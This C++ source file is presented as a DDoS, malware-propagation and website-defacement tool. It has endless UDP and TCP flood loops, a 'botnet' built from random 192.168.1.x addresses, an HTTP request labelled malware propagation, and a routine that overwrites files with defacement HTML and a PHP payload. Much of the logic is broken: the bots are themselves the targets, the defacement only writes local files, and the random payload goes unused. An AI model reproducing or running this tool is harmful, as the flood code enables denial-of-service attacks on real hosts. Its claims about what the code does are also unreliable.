#include <iostream>
#include <fstream>
#include <vector>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <chrono>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/socket.h>

#define PACKET_SIZE 4096
#define MAX_BOTNETS 1000

using namespace std;

vector<string> botnetIPs;
int targetPort;
string targetWebsite;
string defaceHTML;
string malwarePHP;
string malwarePayload;

void udpFlood(string ip, int port) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    sockaddr_in destAddr{};
    destAddr.sin_family = AF_INET;
    destAddr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));

    char packet[PACKET_SIZE];
    memset(packet, 'A', sizeof(packet));

    while (true) {
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&destAddr, sizeof(destAddr));
    }
}

void tcpFlood(string ip, int port) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in destAddr{};
    destAddr.sin_family = AF_INET;
    destAddr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));

    while (true) {
        if (connect(sockfd, (struct sockaddr*)&destAddr, sizeof(destAddr)) == 0) {
            shutdown(sockfd, SHUT_RDWR);
            sockfd = socket(AF_INET, SOCK_STREAM, 0);
        }
    }
}

void propagateMalware(string ip) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in destAddr{};
    destAddr.sin_family = AF_INET;
    destAddr.sin_port = htons(80);
    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));

    if (connect(sockfd, (struct sockaddr*)&destAddr, sizeof(destAddr)) == 0) {
        string request = "GET /" + targetWebsite + ".php HTTP/1.1\r\nHost: " + ip + "\r\nConnection: close\r\n\r\n";
        send(sockfd, request.c_str(), request.length(), 0);
    }
    close(sockfd);
}

void generateIPs() {
    srand(time(nullptr));

    string baseIP = "192.168.1.";
    int basePort = 5555;

    for (int i = 0; i < MAX_BOTNETS; i++) {
        int lastOctet = rand() % 254 + 1;
        string ip = baseIP + to_string(lastOctet);
        botnetIPs.push_back(ip);
    }
}

void startAttack() {
    for (const auto& ip : botnetIPs) {
        thread(udpFlood, ip, targetPort).detach();
        thread(tcpFlood, ip, targetPort).detach();
        thread(propagateMalware, ip).detach();
    }
}

void defaceWebsite() {
    ofstream outFile(targetWebsite);
    outFile << defaceHTML;
    outFile.close();

    ofstream malwareFile(targetWebsite + ".php");
    malwareFile << malwarePHP;
    malwareFile.close();
}

string generateMalwarePayload() {
    srand(time(nullptr));
    string payload;

    for (int i = 0; i < PACKET_SIZE; i++) {
        char randomChar = rand() % 256;
        payload += randomChar;
    }

    return payload;
}

int main() {
    cout << "Enter the target website URL: ";
    cin >> targetWebsite;

    cout << "Enter the target port: ";
    cin >> targetPort;

    cout << "Enter the path to the HTML file for defacing: ";
    cin.ignore();
    getline(cin, defaceHTML);

    cout << "Enter the path to the PHP file for the malware: ";
    getline(cin, malwarePHP);

    malwarePayload = generateMalwarePayload();

    generateIPs();

    cout << "Botnet IPs generated: " << botnetIPs.size() << endl;

    cout << "Starting the DDoS attack and malware propagation..." << endl;
    startAttack();

    cout << "Attack started! To stop the attack, press Ctrl + C." << endl;

    // Wait for the user to stop the attack

    cout << "Defacing the target website..." << endl;
    defaceWebsite();

    cout << "Website defaced successfully!" << endl;

    return 0;
}
